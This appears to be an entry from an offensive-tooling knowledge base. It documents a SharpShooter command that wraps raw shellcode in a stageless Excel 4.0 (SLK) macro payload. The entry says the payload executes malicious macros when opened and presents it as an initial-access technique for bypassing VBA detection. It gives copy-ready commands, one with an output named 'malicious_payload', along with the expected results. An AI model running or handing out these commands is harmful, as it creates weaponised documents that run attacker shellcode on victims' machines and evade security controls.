---
type: command
executor: bash
data: python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - Windows
tags:
  - payload-generation
  - xlm-macro
verified: true
validated: true
---

# SharpShooter Create Stageless SLK Payload

## Command

```bash
python SharpShooter.py --payload slk --rawscfile $_SHELLCODE_FILE --output $_OUTPUT_FILE
```

## Description

This command uses SharpShooter to generate a stageless Excel 4.0 (SLK) payload from raw shellcode, suitable for embedding malicious macros that execute upon opening in Excel. Use this for initial access vectors bypassing VBA detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --payload slk | Specifies SLK (Symbolic Link) format for XLM macros | Yes |
| --rawscfile $_SHELLCODE_FILE | Path to raw binary shellcode file (e.g., shellcode.bin) | Yes |
| --output $_OUTPUT_FILE | Base name for output files (e.g., test; generates test.slk) | Yes |
| python | Python interpreter to run SharpShooter.py | Yes |

## Examples

### Basic Usage

```bash
python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
```

### With Custom Paths

```bash
python SharpShooter.py --payload slk --rawscfile /path/to/custom.bin --output malicious_payload
```

## Expected Output

The command produces files like 'test.slk' containing XLM macros with embedded shellcode. Console output shows generation progress: "Generating SLK payload..." followed by "Payload created successfully." No errors if shellcode is valid; otherwise, tracebacks on format issues. Verify by opening the SLK in Excel and checking for macro execution.

## Related

- [[procedures/xlm-excel-4-macro-sharpshooter-payload-creation]]
- [[tools/SharpShooter]]
